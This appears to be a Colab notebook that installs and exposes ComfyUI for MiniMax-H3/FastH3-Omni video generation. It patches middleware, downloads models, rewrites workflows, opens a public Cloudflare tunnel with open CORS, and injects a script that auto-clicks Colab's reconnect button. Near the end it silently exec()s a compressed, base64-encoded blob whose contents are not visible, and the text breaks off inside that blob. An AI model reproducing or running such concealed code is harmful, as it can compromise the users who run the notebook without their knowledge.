    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

if _is_port_open(8188):
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:8188/api/free",
            data=b'{"unload_models": true, "free_memory": true}',
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
        print("♻️ 已为您热释放旧模型显存并无缝挂载新底模（原 ComfyUI 网页保持在线，无需重启）！")
    except Exception:
        pass
else:
    print("🚀 正在后台启动 ComfyUI 引擎...")
    subprocess.Popen(
        ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
        cwd="/content/ComfyUI",
        start_new_session=True
    )
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

try:
    urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0"}), timeout=35)
except Exception:
    pass

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()
from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 挂载与启动全部完成！（网址保持固定不断连，随时可点击切换其他模型选项）")
print("="*65)
print(f"🌐 【首选直连 · Cloudflare 免403极速缓存通道】：\n👉 {cf_url}")
print("="*65)

display(HTML(f"""
<div style="margin:12px 0;padding:16px;border-radius:10px;background:#1e293b;color:#fff;font-family:sans-serif;">
  <div style="font-size:16px;font-weight:bold;margin-bottom:12px;color:#4ade80;">✅ 模型挂载与 ComfyUI 已就绪（网址固定不断连）！</div>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:10px 22px;background:#22c55e;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;margin-right:12px;">🌐 点击打开 ComfyUI (Cloudflare 首选通道)</a>
  
  <div style="margin-top:10px;font-size:12px;color:#94a3b8;">🛡️ 已开启后台自动防休眠保活心跳（您在 ComfyUI 网页操作时，Colab 不会因闲置自动断连关机）</div>
</div>
<script>
  if (!window.__minimaxColabKeepAlive) {{
    window.__minimaxColabKeepAlive = setInterval(() => {{
      try {{
        const btn = document.querySelector('colab-connect-button');
        if (btn && btn.shadowRoot) {{
          const text = btn.shadowRoot.textContent || '';
          if (text.includes('Reconnect') || text.includes('重新连接')) {{
            btn.click();
          }}
        }}
        fetch(window.location.href, {{method: 'HEAD', cache: 'no-store'}}).catch(()=>{{}});
      }} catch(e) {{}}
    }}, 60000);
  }}
</script>
"""))

try:
    output.eval_js(f'window.open("{cf_url}", "_blank")')
except Exception:
    pass

In [ ]:
# @title ⚡ 4. FastH3-Omni 实时全参选项（UCSD×NVIDIA官方41G原生8步底模 + 13G Blackwell加速版）
import socket
import os, sys, time, subprocess, re, shutil, json, urllib.request
from IPython.display import display, HTML, clear_output
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "body": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["body"] is not None:
            return web.Response(body=_OBJ_INFO_CACHE["body"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["body"] = bytes(resp.body)
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 2048
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
if not os.path.exists("/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"):
    subprocess.run(["git", "clone", "--depth", "1", "https://github.com/Songssx/ComfyUI-MiniMaxH3-TimelineDirector.git", "/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"], check=False)

if not os.path.exists("/content/ComfyUI/main.py"):
    raise SystemExit("❌ 请先运行【🛠️ 1. 必备基础框架】！")

diff_dir = "/content/ComfyUI/models/diffusion_models"
clip_dir = "/content/ComfyUI/models/text_encoders"
os.makedirs(diff_dir, exist_ok=True)
os.makedirs(clip_dir, exist_ok=True)

target_model_bf16 = "【41G满血8步原生-FastH3-Omni】fasth3_omniref_8step_pruned_bf16.safetensors"
target_url_bf16 = "https://huggingface.co/FastVideo/FastH3-Omni-Comfy/resolve/main/diffusion_models/fasth3_omniref_8step_pruned_bf16.safetensors"

target_model_fp4 = "【13G极速Blackwell专属-FastH3-Omni】fasth3_omniref_qad_nvfp4_comfy.safetensors"
target_url_fp4 = "https://huggingface.co/FastVideo/FastH3-Omni-NVFP4-QAD-Comfy/resolve/main/fasth3_omniref_qad_nvfp4_comfy.safetensors"

target_clip = "【25G轻量化-官方INT8】qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
target_clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_int8_convrot.safetensors"

for f in os.listdir(diff_dir):
    if f not in [target_model_bf16, target_model_fp4] and any(k in f for k in ["fl2va", "ref2va", "Remix", "qwen_image_2.1"]):
        try:
            os.remove(os.path.join(diff_dir, f))
            print(f"🗑️ 已卸载其他底模释放空间: {f}")
        except Exception:
            pass

for m_name, m_url in [(target_model_bf16, target_url_bf16), (target_model_fp4, target_url_fp4)]:
    m_path = os.path.join(diff_dir, m_name)
    if not os.path.exists(m_path) or os.path.getsize(m_path) < 1024 * 1024 * 100:
        print(f"⏳ 正在高速下载 FastH3-Omni 模型: {m_name} ...")
        subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "-k", "1M", "--allow-overwrite=true", "-d", diff_dir, "-o", m_name, m_url], check=False)
    print(f"✅ 模型已就绪: {m_name}")

target_clip_fp4 = "【15G轻量化极速版-CLIP】qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
target_clip_fp4_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
for _cn, _cu in [(target_clip, target_clip_url), (target_clip_fp4, target_clip_fp4_url)]:
    _cp = os.path.join(clip_dir, _cn)
    if not os.path.exists(_cp) or os.path.getsize(_cp) < 1024 * 1024 * 100:
        subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "-k", "1M", "--allow-overwrite=true", "-d", clip_dir, "-o", _cn, _cu], check=False)
for _sdir, _src, _dst in [
    (diff_dir, target_model_bf16, "fasth3_omniref_8step_pruned_bf16.safetensors"),
    (diff_dir, target_model_bf16, "fasth3_omniref_8step_pruned_int8_convrot.safetensors"),
    (diff_dir, target_model_fp4, "fasth3_omniref_qad_nvfp4_comfy.safetensors"),
    (clip_dir, target_clip, "qwen3vl_32b_minimax_h3_int8_convrot.safetensors"),
    (clip_dir, target_clip_fp4, "qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"),
    ("/content/ComfyUI/models/vae", "minimax_h3_video_vae_fp16.safetensors", "minimax_h3_video_vae_int8_convrot.safetensors"),
    ("/content/ComfyUI/models/latent_upscale_models", "minimax_h3_latent_upscaler_3d_bf16.safetensors", "minimax_h3_latent_upscaler_3d_conv_v1_fp16.safetensors"),
]:
    if os.path.exists(os.path.join(_sdir, _src)) and not os.path.exists(os.path.join(_sdir, _dst)):
        try: os.symlink(os.path.join(_sdir, _src), os.path.join(_sdir, _dst))
        except Exception: pass

_lora_active = "/content/ComfyUI/models/loras"
os.makedirs("/content/lora_pool_h3", exist_ok=True)
os.makedirs(_lora_active, exist_ok=True)
for _f in os.listdir(_lora_active):
    _p = os.path.join(_lora_active, _f)
    if os.path.islink(_p) or os.path.isfile(_p):
        try: os.unlink(_p)
        except Exception: pass
for _f in os.listdir("/content/lora_pool_h3"):
    if _f.endswith(".safetensors"):
        os.symlink(os.path.join("/content/lora_pool_h3", _f), os.path.join(_lora_active, _f))

_wf_h3 = "/content/wf_pool_h3"
_wf_omni = "/content/wf_pool_omni"
_wf_active = "/content/ComfyUI/user/default/workflows"
os.makedirs(_wf_omni, exist_ok=True)
os.makedirs(_wf_active, exist_ok=True)

if os.path.exists(_wf_h3):
    for wfname in os.listdir(_wf_h3):
        if wfname.endswith(".json"):
            src_wf = os.path.join(_wf_h3, wfname)
            try:
                with open(src_wf, "r", encoding="utf-8") as f:
                    wf = json.load(f)
                for node in wf.get("nodes", []):
                    ntype = node.get("type", "")
                    if ntype == "UNETLoader" and node.get("widgets_values"):
                        node["widgets_values"][0] = target_model_bf16
                    elif ntype == "CLIPLoader" and node.get("widgets_values"):
                        node["widgets_values"][0] = target_clip
                    elif ntype == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and len(node.get("widgets_values", [])) >= 7:
                        node["widgets_values"][5] = target_model_bf16
                        node["widgets_values"][6] = target_clip
                    elif ntype == "FeiHouEasyH3Loader" and len(node.get("widgets_values", [])) >= 3:
                        node["widgets_values"][0], node["widgets_values"][1], node["widgets_values"][2] = target_model_bf16, target_model_bf16, target_clip
                    elif ntype == "FeiHouEasyH3RemixLoader" and len(node.get("widgets_values", [])) >= 2:
                        node["widgets_values"][0], node["widgets_values"][1] = target_model_bf16, target_clip
                    elif ntype in ("LoraLoaderModelOnly", "LoraLoader") and node.get("widgets_values"):
                        lname = str(node["widgets_values"][0])
                        if any(k in lname.lower() for k in ["8step", "turbo", "8步", "dareties"]):
                            node["mode"] = 4
                for _sg in wf.get("definitions", {}).get("subgraphs", []):
                    for _sn in _sg.get("nodes", []):
                        if _sn.get("type") == "UNETLoader" and _sn.get("widgets_values"):
                            _sn["widgets_values"][0] = target_model_bf16
                        elif _sn.get("type") == "CLIPLoader" and _sn.get("widgets_values"):
                            _sn["widgets_values"][0] = target_clip
                omni_wfname = wfname[5:] if wfname.startswith("Omni_") else wfname
                with open(os.path.join(_wf_omni, omni_wfname), "w", encoding="utf-8") as f:
                    json.dump(wf, f, ensure_ascii=False, indent=2)
            except Exception:
                pass

for _f in os.listdir(_wf_active):
    if _f.endswith(".json"):
        try: os.remove(os.path.join(_wf_active, _f))
        except Exception: pass
for _f in os.listdir(_wf_omni):
    if _f.endswith(".json"):
        shutil.copy2(os.path.join(_wf_omni, _f), os.path.join(_wf_active, _f))

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("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